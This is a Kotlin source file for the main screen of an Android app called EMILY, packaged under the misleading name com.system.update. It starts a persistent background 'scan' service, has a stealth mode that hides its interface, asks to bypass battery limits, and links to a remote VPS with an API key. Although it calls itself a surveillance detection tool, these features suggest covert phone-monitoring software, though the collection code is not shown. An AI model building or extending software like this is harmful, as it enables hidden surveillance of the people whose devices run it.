package com.system.update

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.Menu
import android.view.MenuItem
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.system.update.databinding.ActivityMainBinding
import com.system.update.service.EmilyService
import com.system.update.utils.PermissionManager
import com.system.update.utils.PreferenceManager

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private lateinit var permissionManager: PermissionManager
    private lateinit var prefs: PreferenceManager
    
    companion object {
        const val PERMISSION_REQUEST_CODE = 1001
        const val BATTERY_OPTIMIZATION_REQUEST = 1002
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        
        permissionManager = PermissionManager(this)
        prefs = PreferenceManager(this)
        
        setupUI()
        checkPermissions()
        updateServiceStatus()
    }

    private fun setupUI() {
        setSupportActionBar(binding.toolbar)
        
        // Service control buttons
        binding.btnStartService.setOnClickListener {
            if (permissionManager.hasAllPermissions()) {
                startEmilyService()
            } else {
                requestPermissions()
            }
        }
        
        binding.btnStopService.setOnClickListener {
            stopEmilyService()
        }
        
        // Quick scan button
        binding.btnQuickScan.setOnClickListener {
            if (permissionManager.hasAllPermissions()) {
                performQuickScan()
            } else {
                requestPermissions()
            }
        }
        
        // Status indicators
        binding.swStealth.setOnCheckedChangeListener { _, isChecked ->
            prefs.setStealthMode(isChecked)
            updateStealthUI(isChecked)
        }
        
        binding.swAutoStart.setOnCheckedChangeListener { _, isChecked ->
            prefs.setAutoStart(isChecked)
        }
        
        // VPS connection
        binding.btnConnectVps.setOnClickListener {
            connectToVPS()
        }
        
        // Load preferences
        binding.swStealth.isChecked = prefs.isStealthMode()
        binding.swAutoStart.isChecked = prefs.isAutoStart()
        updateStealthUI(prefs.isStealthMode())
    }

    private fun checkPermissions() {
        if (!permissionManager.hasAllPermissions()) {
            requestPermissions()
        }
        
        // Check battery optimization
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!permissionManager.isBatteryOptimizationDisabled()) {
                requestDisableBatteryOptimization()
            }
        }
    }

    private fun requestPermissions() {
        val permissions = permissionManager.getMissingPermissions()
        if (permissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissions.toTypedArray(), PERMISSION_REQUEST_CODE)
        }
    }

    private fun requestDisableBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivityForResult(intent, BATTERY_OPTIMIZATION_REQUEST)
        }
    }

    private fun startEmilyService() {
        val intent = Intent(this, EmilyService::class.java)
        intent.action = EmilyService.ACTION_START
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        
        updateServiceStatus()
        Toast.makeText(this, "EMILY service started", Toast.LENGTH_SHORT).show()
    }

    private fun stopEmilyService() {
        val intent = Intent(this, EmilyService::class.java)
        intent.action = EmilyService.ACTION_STOP
        startService(intent)
        
        updateServiceStatus()
        Toast.makeText(this, "EMILY service stopped", Toast.LENGTH_SHORT).show()
    }

    private fun performQuickScan() {
        val intent = Intent(this, EmilyService::class.java)
        intent.action = EmilyService.ACTION_QUICK_SCAN
        startService(intent)
        
        Toast.makeText(this, "Quick scan initiated", Toast.LENGTH_SHORT).show()
    }

    private fun connectToVPS() {
        showVpsConnectionDialog()
    }
    
    private fun showVpsConnectionDialog() {
        val dialogView = layoutInflater.inflate(R.layout.dialog_vps_connection, null)
        val etEndpoint = dialogView.findViewById<android.widget.EditText>(R.id.etVpsEndpoint)
        val etApiKey = dialogView.findViewById<android.widget.EditText>(R.id.etVpsApiKey)
        val btnTest = dialogView.findViewById<com.google.android.material.button.MaterialButton>(R.id.btnTestConnection)
        val tvStatus = dialogView.findViewById<android.widget.TextView>(R.id.tvConnectionStatus)
        
        // Pre-fill existing values
        etEndpoint.setText(prefs.getVpsEndpoint())
        etApiKey.setText(prefs.getVpsApiKey())
        
        val dialog = androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle("VPS Connection")
            .setView(dialogView)
            .setPositiveButton("Connect") { _, _ ->
                val endpoint = etEndpoint.text.toString().trim()
                val apiKey = etApiKey.text.toString().trim()
                
                if (endpoint.isEmpty() || apiKey.isEmpty()) {
                    Toast.makeText(this, "Please enter both endpoint and API key", Toast.LENGTH_SHORT).show()
                    return@setPositiveButton
                }
                
                // Test connection in background
                Thread {
                    val engine = com.system.update.core.EmilyEngine(this)
                    val success = engine.connectToVPS(endpoint, apiKey)
                    
                    runOnUiThread {
                        if (success) {
                            Toast.makeText(this, "Connected to VPS successfully!", Toast.LENGTH_SHORT).show()
                        } else {
                            Toast.makeText(this, "Failed to connect to VPS", Toast.LENGTH_SHORT).show()
                        }
                    }
                }.start()
            }
            .setNegativeButton("Cancel", null)
            .create()
        
        btnTest.setOnClickListener {
            val endpoint = etEndpoint.text.toString().trim()
            val apiKey = etApiKey.text.toString().trim()
            
            if (endpoint.isEmpty() || apiKey.isEmpty()) {
                tvStatus.text = "Please enter endpoint and API key"
                tvStatus.setTextColor(ContextCompat.getColor(this, R.color.red))
                return@setOnClickListener
            }
            
            tvStatus.text = "Testing connection..."
            tvStatus.setTextColor(ContextCompat.getColor(this, R.color.orange))
            
            Thread {
                try {
                    val client = okhttp3.OkHttpClient.Builder()
                        .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
                        .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
                        .build()
                    
                    val request = okhttp3.Request.Builder()
                        .url("$endpoint/health")
                        .get()
                        .build()
                    
                    val response = client.newCall(request).execute()
                    
                    runOnUiThread {
                        if (response.isSuccessful) {
                            tvStatus.text = "✅ Connection successful"
                            tvStatus.setTextColor(ContextCompat.getColor(this, R.color.green))
                        } else {
                            tvStatus.text = "❌ Connection failed (${response.code})"
                            tvStatus.setTextColor(ContextCompat.getColor(this, R.color.red))
                        }
                    }
                } catch (e: Exception) {
                    runOnUiThread {
                        tvStatus.text = "❌ Connection failed: ${e.message}"
                        tvStatus.setTextColor(ContextCompat.getColor(this, R.color.red))
                    }
                }
            }.start()
        }
        
        dialog.show()
    }

    private fun updateServiceStatus() {
        val isRunning = EmilyService.isRunning
        binding.tvServiceStatus.text = if (isRunning) "RUNNING" else "STOPPED"
        binding.tvServiceStatus.setTextColor(
            ContextCompat.getColor(this, if (isRunning) R.color.green else R.color.red)
        )
        
        binding.btnStartService.isEnabled = !isRunning
        binding.btnStopService.isEnabled = isRunning
        binding.btnQuickScan.isEnabled = !isRunning
    }

    private fun updateStealthUI(stealthMode: Boolean) {
        if (stealthMode) {
            supportActionBar?.hide()
            binding.toolbar.alpha = 0.3f
        } else {
            supportActionBar?.show()
            binding.toolbar.alpha = 1.0f
        }
    }

    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        menuInflater.inflate(R.menu.menu_main, menu)
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        return when (item.itemId) {
            R.id.action_settings -> {
                startActivity(Intent(this, SettingsActivity::class.java))
                true
            }
            R.id.action_logs -> {
                // TODO: Implement logs viewer
                Toast.makeText(this, "Logs viewer coming soon", Toast.LENGTH_SHORT).show()
                true
            }
            R.id.action_about -> {
                showAboutDialog()
                true
            }
            else -> super.onOptionsItemSelected(item)
        }
    }

    private fun showAboutDialog() {
        val dialog = android.app.AlertDialog.Builder(this)
            .setTitle("About EMILY")
            .setMessage("EMILY v1.0.0\nEnhanced Mobile Intelligence for Location-aware Yields\n\nAdvanced surveillance detection tool for Android devices.")
            .setPositiveButton("OK") { dialog, _ -> dialog.dismiss() }
            .create()
        dialog.show()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        when (requestCode) {
            PERMISSION_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show()
                } else {
                    Toast.makeText(this, "Some permissions denied. App may not work properly.", Toast.LENGTH_LONG).show()
                }
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        when (requestCode) {
            BATTERY_OPTIMIZATION_REQUEST -> {
                if (permissionManager.isBatteryOptimizationDisabled()) {
                    Toast.makeText(this, "Battery optimization disabled", Toast.LENGTH_SHORT).show()
                } else {
                    Toast.makeText(this, "Battery optimization not disabled", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        updateServiceStatus()
    }
}
